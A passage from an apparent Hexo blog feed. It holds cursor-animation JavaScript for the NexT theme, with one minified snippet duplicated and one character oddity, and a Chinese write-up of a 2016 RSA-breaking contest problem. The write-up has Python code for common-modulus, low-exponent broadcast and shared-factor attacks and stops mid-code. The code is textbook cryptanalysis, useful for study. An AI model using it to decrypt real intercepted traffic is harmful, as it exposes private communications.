class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">class Circle &#123;</span><br><span class="line">  constructor(&#123; origin, speed, color, angle, context &#125;) &#123;</span><br><span class="line">    this.origin = origin</span><br><span class="line">    this.position = &#123; ...this.origin &#125;</span><br><span class="line">    this.color = color</span><br><span class="line">    this.speed = speed</span><br><span class="line">    this.angle = angle</span><br><span class="line">    this.context = context</span><br><span class="line">    this.renderCount = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  draw() &#123;</span><br><span class="line">    this.context.fillStyle = this.color</span><br><span class="line">    this.context.beginPath()</span><br><span class="line">    this.context.arc(this.position.x, this.position.y, 2, 0, Math.PI * 2)</span><br><span class="line">    this.context.fill()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  move() &#123;</span><br><span class="line">    this.position.x = (Math.sin(this.angle) * this.speed) + this.position.x</span><br><span class="line">    this.position.y = (Math.cos(this.angle) * this.speed) + this.position.y + (this.renderCount * 0.3)</span><br><span class="line">    this.renderCount++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Boom &#123;</span><br><span class="line">  constructor (&#123; origin, context, circleCount = 16, area &#125;) &#123;</span><br><span class="line">    this.origin = origin</span><br><span class="line">    this.context = context</span><br><span class="line">    this.circleCount = circleCount</span><br><span class="line">    this.area = area</span><br><span class="line">    this.stop = false</span><br><span class="line">    this.circles = []</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  randomArray(range) &#123;</span><br><span class="line">    const length = range.length</span><br><span class="line">    const randomIndex = Math.floor(length * Math.random())</span><br><span class="line">    return range[randomIndex]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  randomColor() &#123;</span><br><span class="line">    const range = [&#x27;8&#x27;, &#x27;9&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;]</span><br><span class="line">    return &#x27;#&#x27; + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  randomRange(start, end) &#123;</span><br><span class="line">    return (end - start) * Math.random() + start</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init() &#123;</span><br><span class="line">    for(let i = 0; i &lt; this.circleCount; i++) &#123;</span><br><span class="line">      const circle = new Circle(&#123;</span><br><span class="line">        context: this.context,</span><br><span class="line">        origin: this.origin,</span><br><span class="line">        color: this.randomColor(),</span><br><span class="line">        angle: this.randomRange(Math.PI - 1, Math.PI + 1),</span><br><span class="line">        speed: this.randomRange(1, 6)</span><br><span class="line">      &#125;)</span><br><span class="line">      this.circles.push(circle)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  move() &#123;</span><br><span class="line">    this.circles.forEach((circle, index) =&gt; &#123;</span><br><span class="line">      if (circle.position.x &gt; this.area.width || circle.position.y &gt; this.area.height) &#123;</span><br><span class="line">        return this.circles.splice(index, 1)</span><br><span class="line">      &#125;</span><br><span class="line">      circle.move()</span><br><span class="line">    &#125;)</span><br><span class="line">    if (this.circles.length == 0) &#123;</span><br><span class="line">      this.stop = true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  draw() &#123;</span><br><span class="line">    this.circles.forEach(circle =&gt; circle.draw())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CursorSpecialEffects &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.computerCanvas = document.createElement(&#x27;canvas&#x27;)</span><br><span class="line">    this.renderCanvas = document.createElement(&#x27;canvas&#x27;)</span><br><span class="line"></span><br><span class="line">    this.computerContext = this.computerCanvas.getContext(&#x27;2d&#x27;)</span><br><span class="line">    this.renderContext = this.renderCanvas.getContext(&#x27;2d&#x27;)</span><br><span class="line"></span><br><span class="line">    this.globalWidth = window.innerWidth</span><br><span class="line">    this.globalHeight = window.innerHeight</span><br><span class="line"></span><br><span class="line">    this.booms = []</span><br><span class="line">    this.running = false</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleMouseDown(e) &#123;</span><br><span class="line">    const boom = new Boom(&#123;</span><br><span class="line">      origin: &#123; x: e.clientX, y: e.clientY &#125;,</span><br><span class="line">      context: this.computerContext,</span><br><span class="line">      area: &#123;</span><br><span class="line">        width: this.globalWidth,</span><br><span class="line">        height: this.globalHeight</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    boom.init()</span><br><span class="line">    this.booms.push(boom)</span><br><span class="line">    this.running || this.run()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handlePageHide() &#123;</span><br><span class="line">    this.booms = []</span><br><span class="line">    this.running = false</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init() &#123;</span><br><span class="line">    const style = this.renderCanvas.style</span><br><span class="line">    style.position = &#x27;fixed&#x27;</span><br><span class="line">    style.top = style.left = 0</span><br><span class="line">    style.zIndex = &#x27;999999999999999999999999999999999999999999&#x27;</span><br><span class="line">    style.pointerEvents = &#x27;none&#x27;</span><br><span class="line"></span><br><span class="line">    style.width = this.renderCanvas.width = this.computerCanvas.width = this.globalWidth</span><br><span class="line">    style.height = this.renderCanvas.height = this.computerCanvas.height = this.globalHeight</span><br><span class="line"></span><br><span class="line">    document.body.append(this.renderCanvas)</span><br><span class="line"></span><br><span class="line">    window.addEventListener(&#x27;mousedown&#x27;, this.handleMouseDown.bind(this))</span><br><span class="line">    window.addEventListener(&#x27;pagehide&#x27;, this.handlePageHide.bind(this))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  run() &#123;</span><br><span class="line">    this.running = true</span><br><span class="line">    if (this.booms.length == 0) &#123;</span><br><span class="line">      return this.running = false</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requestAnimationFrame(this.run.bind(this))</span><br><span class="line"></span><br><span class="line">    this.computerContext.clearRect(0, 0, this.globalWidth, this.globalHeight)</span><br><span class="line">    this.renderContext.clearRect(0, 0, this.globalWidth, this.globalHeight)</span><br><span class="line"></span><br><span class="line">    this.booms.forEach((boom, index) =&gt; &#123;</span><br><span class="line">      if (boom.stop) &#123;</span><br><span class="line">        return this.booms.splice(index, 1)</span><br><span class="line">      &#125;</span><br><span class="line">      boom.move()</span><br><span class="line">      boom.draw()</span><br><span class="line">    &#125;)</span><br><span class="line">    this.renderContext.drawImage(this.computerCanvas, 0, 0, this.globalWidth, this.globalHeight)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const cursorSpecialEffects = new CursorSpecialEffects()</span><br><span class="line">cursorSpecialEffects.init()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>explosion.min.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl)&#123;var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)&#125;&quot;use strict&quot;;function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl)&#123;var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>love.min.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!function(e,t,a)&#123;function n()&#123;c(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=&quot;left:&quot;+d[e].x+&quot;px;top:&quot;+d[e].y+&quot;px;opacity:&quot;+d[e].alpha+&quot;;transform:scale(&quot;+d[e].scale+&quot;,&quot;+d[e].scale+&quot;) rotate(45deg);background:&quot;+d[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function o()&#123;var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.οnclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function s()&#123;return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>text.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var a_idx = 0;</span><br><span class="line">jQuery(document).ready(function($) &#123;</span><br><span class="line">  $(&quot;body&quot;).click(function(e) &#123;</span><br><span class="line">    var a = new Array(&quot;富强&quot;, &quot;民主&quot;, &quot;文明&quot;, &quot;和谐&quot;, &quot;自由&quot;, &quot;平等&quot;, &quot;公正&quot; ,&quot;法治&quot;, &quot;爱国&quot;, &quot;敬业&quot;, &quot;诚信&quot;, &quot;友善&quot;);</span><br><span class="line">    var $i = $(&quot;&lt;span/&gt;&quot;).text(a[a_idx]);</span><br><span class="line">    var x = e.pageX,</span><br><span class="line">      y = e.pageY;</span><br><span class="line">    $i.css(&#123;</span><br><span class="line">      &quot;z-index&quot;: 99999,</span><br><span class="line">      &quot;top&quot;: y - 28,</span><br><span class="line">      &quot;left&quot;: x - a[a_idx].length * 8,</span><br><span class="line">      &quot;position&quot;: &quot;absolute&quot;,</span><br><span class="line">      &quot;color&quot;: &quot;#ff7a45&quot;</span><br><span class="line">    &#125;);</span><br><span class="line">    $(&quot;body&quot;).append($i);</span><br><span class="line">    $i.animate(&#123;</span><br><span class="line">      &quot;top&quot;: y - 180,</span><br><span class="line">      &quot;opacity&quot;: 0</span><br><span class="line">    &#125;, 1500, function() &#123;</span><br><span class="line">      $i.remove();</span><br><span class="line">    &#125;);</span><br><span class="line">    a_idx = (a_idx + 1) % a.length;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Next添加数学公式支持"><a href="#Next添加数学公式支持" class="headerlink" title="Next添加数学公式支持"></a>Next添加数学公式支持</h3><p>有效解决方案：<a href="https://xiaozhoua.top/2021/04/13/Blog/%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BALatex%E5%85%AC%E5%BC%8F/">https://xiaozhoua.top/2021/04/13/Blog/%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BALatex%E5%85%AC%E5%BC%8F/</a></p><h3 id="特别牛叉的网站，有时间照着这个再整一整"><a href="#特别牛叉的网站，有时间照着这个再整一整" class="headerlink" title="特别牛叉的网站，有时间照着这个再整一整"></a>特别牛叉的网站，有时间照着这个再整一整</h3><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">https://blog.csdn.net/as480133937/article/details/100138838</a></p><h3 id="博客部署"><a href="#博客部署" class="headerlink" title="博客部署"></a>博客部署</h3><p>也就三条：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new title</span><br><span class="line">hexo g <span class="comment">#生成静态文件</span></span><br><span class="line">hexo s <span class="comment">#本地预览</span></span><br><span class="line">hexo d <span class="comment">#远程部署</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;搭建hexo，NexT主题博客时收集到的部分内容&lt;/p&gt;</summary>
    
    
    
    
    <category term="blog" scheme="http://example.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>RSA 加密体制破译</title>
    <link href="http://example.com/2022/01/12/RSA_breaking/"/>
    <id>http://example.com/2022/01/12/RSA_breaking/</id>
    <published>2022-01-12T04:03:55.000Z</published>
    <updated>2022-01-13T08:25:55.387Z</updated>
    
    <content type="html"><![CDATA[<p>首届（2016）全国高校密码数学挑战赛</p><span id="more"></span><p><strong>赛题三：RSA 加密体制破译</strong></p><p>​    <strong>1 问题描述</strong></p><pre><code>     有人制作了一个 RSA 加解密软件（采用的 RSA 体制的参数特点描 述见密码背景部分）。已知该软件发送某个明文的所有参数和加密过 程的全部数据（加密案例文件详见附件 3-1）。Alice 使用该软件发送 了一个通关密语，且所有加密数据已经被截获，请问能否仅从加密数 据恢复该通关密语及 RSA 体制参数？如能请给出原文和参数，如不能 请给出已恢复部分并说明剩余部分不能恢复的理由？</code></pre><p>​    <strong>2.求解过程</strong></p><p>​        本次实验通过多种RSA攻击策略还原了13个Frame片段的明文。</p><h2 id="用到的RSA攻击方法"><a href="#用到的RSA攻击方法" class="headerlink" title="用到的RSA攻击方法"></a>用到的RSA攻击方法</h2><h3 id="1-公共模数攻击"><a href="#1-公共模数攻击" class="headerlink" title="1.公共模数攻击"></a>1.公共模数攻击</h3><p><em>攻击条件：</em>当两个用户使用相同模数N，不同私钥，加密同一明文消息时存在此攻击</p><p><em>攻击原理：</em></p><p>设两用户公钥为$e_1,e_2$，二者互质。明文消息$m$，密文$c1，c2$则有：</p><script type="math/tex; mode=display">c_1=m^{e1}mod\ N</script><script type="math/tex; mode=display">c_2=m^{e2}mod\ N</script><p>当$Adversary$截获了$c_1,c_2$后，可以用扩展欧几里得算法计算：$re_1+se_2=1\ mod\ n $的两个整数$r$和$s$，由此：</p><script type="math/tex; mode=display">\begin{align}c_1^rc_2^s &=m^{re_1}m^{se_2}\ mod\ n\\&=m^{re_1+se_2}\ mod\ n\\&=m\ mod\ n\end{align}</script><p>共模攻击代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">公共模数攻击,输入对应frame序号a,b</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sameModulAttack</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> ns[a]!=ns[b]:</span><br><span class="line">        <span class="keyword">return</span>-<span class="number">1</span></span><br><span class="line">    e1,e2,c1,c2,n = <span class="built_in">int</span>(es[a], <span class="number">16</span>),<span class="built_in">int</span>(es[b], <span class="number">16</span>),<span class="built_in">int</span>(cs[a], <span class="number">16</span>),<span class="built_in">int</span>(cs[b], <span class="number">16</span>),<span class="built_in">int</span>(ns[a],<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#r*e1+s*e2=g(g=1)mod n，其中rs有一个是负的</span></span><br><span class="line">    g,r,s = egcd(e1, e2)</span><br><span class="line">    <span class="comment">#这里pow不能算负多少次方于是吧那个负项拆成了c^&#123;s&#125;=c^&#123;-1*s&#125;=(c^&#123;-1&#125;)^s</span></span><br><span class="line">    <span class="keyword">if</span> r&lt;<span class="number">0</span>:</span><br><span class="line">        r = - r</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s&lt;<span class="number">0</span>:</span><br><span class="line">        s = - s</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    <span class="comment">#message解出来就是此处的m</span></span><br><span class="line">    m = <span class="built_in">pow</span>(c1,r,n)*<span class="built_in">pow</span>(c2,s,n) % n</span><br><span class="line">    <span class="comment">#print(m)</span></span><br><span class="line">    <span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">return</span> binascii.a2b_hex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-低加密指数广播攻击"><a href="#2-低加密指数广播攻击" class="headerlink" title="2.低加密指数广播攻击"></a>2.低加密指数广播攻击</h3><p><em>攻击条件：</em>选取的加密指数$e$较小，并且使用相同的加密指数给一个接收者群发送了相同的信息</p><p><em>攻击原理：</em></p><p>例如选取接收者群有三个成员的情况：</p><script type="math/tex; mode=display">c_1=m^e\ mod\ n_1\\c_2=m^e\ mod\ n_2\\c_3=m^e\ mod\ n_3</script><p>对上述几个等式，用中国剩余定理求解，可以得到：</p><script type="math/tex; mode=display">c_x =N_1N_1^{-1}c_1+N_2N_2^{-1}c_2+N_3N_3^{-1}c_3\ mod\ N\ \ \ (N=n_1n_2n_3)</script><p>又当e=3时，可以求得：</p><script type="math/tex; mode=display">m=\sqrt[3]{c_x}</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">低加密指数爆破攻击（广播攻击）</span></span><br><span class="line"><span class="string">c1 = m^5 mod N1</span></span><br><span class="line"><span class="string">c2 = m^5 mod N2</span></span><br><span class="line"><span class="string">c3 = m^5 mod N3</span></span><br><span class="line"><span class="string">c4 = m^5 mod N4</span></span><br><span class="line"><span class="string">c5 = m^5 mod N5</span></span><br><span class="line"><span class="string">用中国剩余定理解出m^5，之后开五次根即求出m</span></span><br><span class="line"><span class="string">这种也只有在几个m相同的情况下有的算</span></span><br><span class="line"><span class="string">Frame3,Frame8,Frame12,Frame16,Frame20采用低加密指数e=5进行加密，恰好能够进行爆破</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lowEburp5</span>():</span></span><br><span class="line">    sessions = [[<span class="built_in">int</span>(cs[<span class="number">3</span>],<span class="number">16</span>),<span class="built_in">int</span>(ns[<span class="number">3</span>],<span class="number">16</span>)],[<span class="built_in">int</span>(cs[<span class="number">8</span>],<span class="number">16</span>),<span class="built_in">int</span>(ns[<span class="number">8</span>],<span class="number">16</span>)],[<span class="built_in">int</span>(cs[<span class="number">12</span>],<span class="number">16</span>),<span class="built_in">int</span>(ns[<span class="number">12</span>],<span class="number">16</span>)],[<span class="built_in">int</span>(cs[<span class="number">16</span>],<span class="number">16</span>),<span class="built_in">int</span>(ns[<span class="number">16</span>],<span class="number">16</span>)],[<span class="built_in">int</span>(cs[<span class="number">20</span>],<span class="number">16</span>),<span class="built_in">int</span>(ns[<span class="number">20</span>],<span class="number">16</span>)]]</span><br><span class="line">    ret,N = chinese_remainder_theorem(sessions)</span><br><span class="line">    ans = gmpy2.iroot(ret,<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(ans[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">return</span> binascii.a2b_hex(<span class="built_in">hex</span>(ans[<span class="number">0</span>])[<span class="number">2</span>:])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-因数碰撞攻击"><a href="#3-因数碰撞攻击" class="headerlink" title="3.因数碰撞攻击"></a>3.因数碰撞攻击</h3><p><em>攻击条件</em>：获取到两个公钥参数$N_1，N_2$ 不互素的密文信息</p><p><em>攻击原理</em>：</p><p>当存在两个公钥的$ N_1，N_2$ 不互素时，我们显然可以直接对这两个数求最大公因数，获得二者的共同的p然后直接获得$ q=n/p$，进而获得相应的私钥。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span 